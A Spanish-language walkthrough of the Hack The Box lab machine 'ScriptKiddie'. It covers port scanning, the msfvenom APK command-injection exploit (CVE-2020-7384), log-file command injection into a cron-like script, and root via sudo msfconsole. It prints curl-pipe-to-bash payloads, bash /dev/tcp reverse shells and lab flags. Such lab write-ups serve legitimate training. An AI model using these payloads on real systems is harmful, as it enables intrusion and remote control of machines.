---
icon: desktop
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# ScriptKiddie



`ScriptKiddie` es una máquina Linux de dificultad fácil que presenta una vulnerabilidad de Metasploit ([CVE-2020-7384](https://cve.mitre.org/cgi-bin/cvename.cgi?name=2020-7384)), junto con ataques clásicos como la inyección de comandos del sistema operativo y una configuración `sudo` insegura sin contraseña. El punto de apoyo inicial en la máquina se obtiene cargando un archivo `.apk` malicioso desde una interfaz web que llama a una versión vulnerable de `msfvenom` para generar cargas útiles descargables. Una vez que se obtiene el shell, el movimiento lateral a un segundo usuario se realiza inyectando comandos en un archivo de registro que proporciona una entrada no higienizada a un script Bash que se activa al modificar el archivo. A este usuario se le permite ejecutar `msfconsole` como `root` a través de `sudo` sin proporcionar una contraseña, lo que resulta en la escalada de privilegios.

<figure><img src="../../.gitbook/assets/ScriptKiddie.png" alt="" width="563"><figcaption></figcaption></figure>

***

## Reconnaissance



```bash
❯ nmap -p- --open -sS --min-rate 1000 -vvv -Pn -n 10.10.10.226 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-02 16:36 CET
Initiating SYN Stealth Scan at 16:36
Scanning 10.10.10.226 [65535 ports]
Discovered open port 22/tcp on 10.10.10.226
Discovered open port 5000/tcp on 10.10.10.226
Completed SYN Stealth Scan at 16:37, 12.84s elapsed (65535 total ports)
Nmap scan report for 10.10.10.226
Host is up, received user-set (0.034s latency).
Scanned at 2025-03-02 16:36:48 CET for 13s
Not shown: 65530 closed tcp ports (reset), 3 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 63
5000/tcp open  upnp    syn-ack ttl 63

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 12.92 seconds
           Raw packets sent: 65811 (2.896MB) | Rcvd: 65538 (2.622MB)
```



```bash
❯ extractPorts allPorts

[*] Extracting information...

	[*] IP Address: 10.10.10.226
	[*] Open ports: 22,5000

[*] Ports copied to clipboard
```



```bash
❯ nmap -sCV -p22,5000 10.10.10.226 -A -oN targeted -oX targetedXML
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-02 16:42 CET
Nmap scan report for 10.10.10.226
Host is up (0.034s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3c:65:6b:c2:df:b9:9d:62:74:27:a7:b8:a9:d3:25:2c (RSA)
|   256 b9:a1:78:5d:3c:1b:25:e0:3c:ef:67:8d:71:d3:a3:ec (ECDSA)
|_  256 8b:cf:41:82:c6:ac:ef:91:80:37:7c:c9:45:11:e8:43 (ED25519)
5000/tcp open  http    Werkzeug httpd 0.16.1 (Python 3.8.5)
|_http-title: k1d'5 h4ck3r t00l5
|_http-server-header: Werkzeug/0.16.1 Python/3.8.5
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19, Linux 5.0 - 5.14
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 443/tcp)
HOP RTT      ADDRESS
1   33.69 ms 10.10.14.1
2   33.82 ms 10.10.10.226

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.39 seconds
```



```bash
❯ xsltproc targetedXML > index.html

❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```





<figure><img src="../../.gitbook/assets/5268_vmware_SkIcv2odJc.png" alt=""><figcaption></figcaption></figure>



```bash
❯ whatweb -a 3 http://10.10.10.226:5000
http://10.10.10.226:5000 [200 OK] Country[RESERVED][ZZ], HTTPServer[Werkzeug/0.16.1 Python/3.8.5], IP[10.10.10.226], Python[3.8.5], Title[k1d'5 h4ck3r t00l5], Werkzeug[0.16.1]
```





<figure><img src="../../.gitbook/assets/5269_vmware_e8rEYYA1G5.png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/imagen (455).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/imagen (456).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/imagen (457).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/imagen (458).png" alt=""><figcaption></figcaption></figure>





<figure><img src="../../.gitbook/assets/imagen (459).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/imagen (460).png" alt=""><figcaption></figcaption></figure>



```bash
❯ searchsploit msfvenom
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                      |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Metasploit Framework 6.0.11 - msfvenom APK template command injection                                                                                                                               | multiple/local/49491.py
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```



```bash
❯ searchsploit -m multiple/local/49491.py
  Exploit: Metasploit Framework 6.0.11 - msfvenom APK template command injection
      URL: https://www.exploit-db.com/exploits/49491
     Path: /usr/share/exploitdb/exploits/multiple/local/49491.py
    Codes: CVE-2020-7384
 Verified: False
File Type: Python script, ASCII text executable
Copied to: /home/kali/Desktop/HackTheBox/Linux/ScriptKiddie/ScriptKiddie/49491.py


❯ mv 49491.py CVE-2020-7384.py
```



{% code title="CVE-2020-7384.py" %}
```python
# Exploit Title: Metasploit Framework 6.0.11 - msfvenom APK template command injection
# Exploit Author: Justin Steven
# Vendor Homepage: https://www.metasploit.com/
# Software Link: https://www.metasploit.com/
# Version: Metasploit Framework 6.0.11 and Metasploit Pro 4.18.0
# CVE : CVE-2020-7384

#!/usr/bin/env python3
import subprocess
import tempfile
import os
from base64 import b64encode

# Change me
payload = 'curl http://10.10.14.2/gzzcoo'
```
{% endcode %}



```bash
❯ python3 CVE-2020-7384.py
[+] Manufacturing evil apkfile
Payload: curl http://10.10.14.2/gzzcoo
-dname: CN='|echo Y3VybCBodHRwOi8vMTAuMTAuMTQuMi9nenpjb28= | base64 -d | sh #

  adding: empty (stored 0%)
jar signed.

Warning: 
The signer's certificate is self-signed.
The SHA1 algorithm specified for the -digestalg option is considered a security risk and is disabled.
The SHA1withRSA algorithm specified for the -sigalg option is considered a security risk and is disabled.
POSIX file permission and/or symlink attributes detected. These attributes are ignored when signing and are not protected by the signature.

[+] Done! apkfile is at /tmp/tmp1drlqg5d/evil.apk
Do: msfvenom -x /tmp/tmp1drlqg5d/evil.apk -p android/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -o /dev/null

❯ ls -l /tmp/tmp1drlqg5d/evil.apk
.rw-rw-r-- kali kali 1.9 KB Sun Mar  2 17:11:37 2025  /tmp/tmp1drlqg5d/evil.apk
```



```bash
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```



<figure><img src="../../.gitbook/assets/5276_vmware_JPoM0pnDYm.png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/5277_vmware_oR6bJIy4GF.png" alt=""><figcaption></figcaption></figure>





```bash
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.226 - - [02/Mar/2025 17:14:20] code 404, message File not found
10.10.10.226 - - [02/Mar/2025 17:14:20] "GET /gzzcoo HTTP/1.1" 404 -
```



```bash
❯ echo '#!/bin/bash \n/bin/bash -c "bash -i >& /dev/tcp/10.10.14.2/443 0>&1"' > shell.sh
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```



{% code title="CVE-2020-7384.py" %}
```python
# Exploit Title: Metasploit Framework 6.0.11 - msfvenom APK template command injection
# Exploit Author: Justin Steven
# Vendor Homepage: https://www.metasploit.com/
# Software Link: https://www.metasploit.com/
# Version: Metasploit Framework 6.0.11 and Metasploit Pro 4.18.0
# CVE : CVE-2020-7384

#!/usr/bin/env python3
import subprocess
import tempfile
import os
from base64 import b64encode

# Change me
payload = 'curl http://10.10.14.2/shell.sh|bash'
```
{% endcode %}



```basic
❯ nc -nlvp 443
listening on [any] 443 ...
```



```bash
❯ python3 CVE-2020-7384.py
[+] Manufacturing evil apkfile
Payload: curl http://10.10.14.2/shell.sh|bash
-dname: CN='|echo Y3VybCBodHRwOi8vMTAuMTAuMTQuMi9zaGVsbC5zaHxiYXNo | base64 -d | sh #

  adding: empty (stored 0%)
jar signed.

Warning: 
The signer's certificate is self-signed.
The SHA1 algorithm specified for the -digestalg option is considered a security risk and is disabled.
The SHA1withRSA algorithm specified for the -sigalg option is considered a security risk and is disabled.
POSIX file permission and/or symlink attributes detected. These attributes are ignored when signing and are not protected by the signature.

[+] Done! apkfile is at /tmp/tmp7fwr95xx/evil.apk
Do: msfvenom -x /tmp/tmp7fwr95xx/evil.apk -p android/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -o /dev/null

❯ ls -l /tmp/tmp7fwr95xx/evil.apk
.rw-rw-r-- kali kali 1.9 KB Sun Mar  2 17:19:44 2025  /tmp/tmp7fwr95xx/evil.apk
```



<figure><img src="../../.gitbook/assets/5281_vmware_LJyAgqDbrR.png" alt=""><figcaption></figcaption></figure>



```bash
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.2] from (UNKNOWN) [10.10.10.226] 48646
bash: cannot set terminal process group (891): Inappropriate ioctl for device
bash: no job control in this shell
kid@scriptkiddie:~/html$ cat /home/kid/user.txt
16c4a15c6103d2cac9a2b6b4c5e224aa
```



```bash
kid@scriptkiddie:~/html$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
kid@scriptkiddie:~/html$ ^Z
zsh: suspended  nc -nlvp 443
❯ stty raw -echo;fg
[1]  + continued  nc -nlvp 443
                              reset xterm
kid@scriptkiddie:~/html$ export TERM=xterm
kid@scriptkiddie:~/html$ export SHELL=bash
kid@scriptkiddie:~/html$ stty rows 46 columns 230
```



```bash
kid@scriptkiddie:/home/pwn$ ls -l
total 8
drwxrw---- 2 pwn pwn 4096 Mar  2 16:20 recon
-rwxrwxr-- 1 pwn pwn  250 Jan 28  2021 scanlosers.sh
kid@scriptkiddie:/home/pwn$ ./scanlosers.sh
bash: ./scanlosers.sh: Permission denied

kid@scriptkiddie:/home/pwn$ cat scanlosers.sh 
#!/bin/bash

log=/home/kid/logs/hackers

cd /home/pwn/
cat $log | cut -d' ' -f3- | sort -u | while read ip; do
    sh -c "nmap --top-ports 10 -oN recon/${ip}.nmap ${ip} 2>&1 >/dev/null" &
done

if [[ $(wc -l < $log) -gt 0 ]]; then echo -n > $log; fi
```

/home/kid/html/app.py

{% code title="app.py" %}
```bash
def searchsploit(text, srcip):
    if regex_alphanum.match(text):
        result = subprocess.check_output(['searchsploit', '--color', text])
        return render_template('index.html', searchsploit=result.decode('UTF-8', 'ignore'))
    else:
        with open('/home/kid/logs/hackers', 'a') as f:
            f.write(f'[{datetime.datetime.now()}] {srcip}\n')
        return render_template('index.html', sserror="stop hacking me - well hack you back")
```
{% endcode %}



```bash
regex_alphanum = re.compile(r'^[A-Za-z0-9 \.]+$')
```



```python
❯ python3
Python 3.13.2 (main, Feb  5 2025, 01:23:35) [GCC 14.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import datetime
>>> srcip = "10.10.14.2"
>>> f'[{datetime.datetime.now()}] {srcip}\n'
'[2025-03-02 17:40:10.917029] 10.10.14.2\n'
```



```bash
kid@scriptkiddie:~/logs$ echo '[2025-03-02 17:40:10.917029] 10.10.14.2' > hackers; cat hackers; echo 'pause'; sleep 1; cat hackers; echo 'done'
[2025-03-02 17:40:10.917029] 10.10.14.2
pause
done
```



```bash
kid@scriptkiddie:~/logs$ echo '[2025-03-02 17:40:10.917029] 10.10.14.2' | cut -d' ' -f3- 
10.10.14.2
```



{% code title="scanlosers.sh" %}
```bash
sh -c "nmap --top-ports 10 -oN recon/${ip}.nmap ${ip} 2>&1 >/dev/null" &
```
{% endcode %}



```bash
kid@scriptkiddie:~/logs$ echo 'x x x 10.10.14.2; curl 10.10.14.2/gzzcoo #' | cut -d' ' -f3- 
x 10.10.14.2; curl 10.10.14.2/gzzcoo #
```



```bash
nmap --top-ports 10 -oN recon/x 10.10.14.2; curl 10.10.14.2/gzzcoo #.nmap x 10.10.14.2; curl 10.10.14.2/gzzcoo # 2>&1 >/dev/null"
```



```bash
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```



```bash
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```



```bash
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.226 - - [02/Mar/2025 18:03:45] code 404, message File not found
10.10.10.226 - - [02/Mar/2025 18:03:45] "GET /gzzcoo HTTP/1.1" 404 -
```



```bash
❯ nc -nlvp 444
listening on [any] 444 ...
```



```bash
kid@scriptkiddie:~/logs$ echo "x x x 10.10.14.2; /bin/bash -c 'bash -i >& /dev/tcp/10.10.14.2/444 0>&1' #" > hackers
```



```bash
❯ nc -nlvp 444
listening on [any] 444 ...
connect to [10.10.14.2] from (UNKNOWN) [10.10.10.226] 44498
bash: cannot set terminal process group (840): Inappropriate ioctl for device
bash: no job control in this shell
pwn@scriptkiddie:~$ 
```



```bash
❯ nc -nlvp 444
listening on [any] 444 ...
connect to [10.10.14.2] from (UNKNOWN) [10.10.10.226] 44498
bash: cannot set terminal process group (840): Inappropriate ioctl for device
bash: no job control in this shell
pwn@scriptkiddie:~$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
pwn@scriptkiddie:~$ ^Z
zsh: suspended  nc -nlvp 444
❯ stty raw -echo;fg
[1]  + continued  nc -nlvp 444
                              reset xterm
                              
pwn@scriptkiddie:~$ export TERM=xterm
pwn@scriptkiddie:~$ export SHELL=bash
pwn@scriptkiddie:~$ stty rows 46 columns 230
```



```bash
pwn@scriptkiddie:~$ sudo -l
Matching Defaults entries for pwn on scriptkiddie:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User pwn may run the following commands on scriptkiddie:
    (root) NOPASSWD: /opt/metasploit-framework-6.0.9/msfconsole
```



```bash
❯ searchbins -b msfconsole -f sudo

[+] Binary: msfconsole

================================================================================
[*] Function: sudo -> [https://gtfobins.github.io/gtfobins/msfconsole/#sudo]

	| sudo msfconsole
	| msf6 > irb
	| >> system("/bin/sh")
```



````bash
pwn@scriptkiddie:~$ sudo /opt/metasploit-framework-6.0.9/msfconsole 
                                                  

                                   .,,.                  .
                                .\$$$$$L..,,==aaccaacc%#s$b.       d8,    d8P
                     d8P        #$$$$$$$$$$$$$$$$$$$$$$$$$$$b.    `BP  d888888p
                  d888888P      '7$$$$\""""''^^`` .7$$$|D*"'```         ?88'
  d8bd8b.d8p d8888b ?88' d888b8b            _.os#$|8*"`   d8P       ?8b  88P
  88P`?P'?P d8b_,dP 88P d8P' ?88       .oaS###S*"`       d8P d8888b $whi?88b 88b
 d88  d8 ?8 88b     88b 88b  ,88b .osS$$$$*" ?88,.d88b, d88 d8P' ?88 88P `?8b
d88' d88b 8b`?8888P'`?8b`?88P'.aS$$$$Q*"`    `?88'  ?88 ?88 88b  d88 d88
                          .a#$$$$$$"`          88b  d8P  88b`?8888P'
                       ,s$$$$$$$"`             888888P'   88n      _.,,,ass;:
                    .a$$$$$$$P`               d88P'    .,.ass%#S$$$$$$$$$$$$$$'
                 .a$###$$$P`           _.,,-aqsc#SS$$$$$$$$$$$$$$$$$$$$$$$$$$'
              ,a$$###$$P`  _.,-ass#S$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$####SSSS'
           .a$$$$$$$$$$SSS$$$$$$$$$$$$$$$$$$$$$$$$$$$$SS##==--""''^^/$$$$$$'
_______________________________________________________________   ,&$$$$$$'_____
                                                                 ll&&$$$$'
                                                              .;;lll&&&&'
                                                            ...;;lllll&'
                                                          ......;;;llll;;;....
                                                           ` ......;;;;... .  .


       =[ metasploit v6.0.9-dev                           ]
+ -- --=[ 2069 exploits - 1122 auxiliary - 352 post       ]
+ -- --=[ 592 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]

Metasploit tip: View advanced module options with advanced

msf6 > irb
[*] Starting IRB shell...
[*] You are in the "framework" object
>> system("/bin/bash")

root@scriptkiddie:/home/pwn# whoami
root
root@scriptkiddie:/home/pwn# cat /root/root.txt 
17c4d4fbd4d18cce56ed423a84b6e873
````
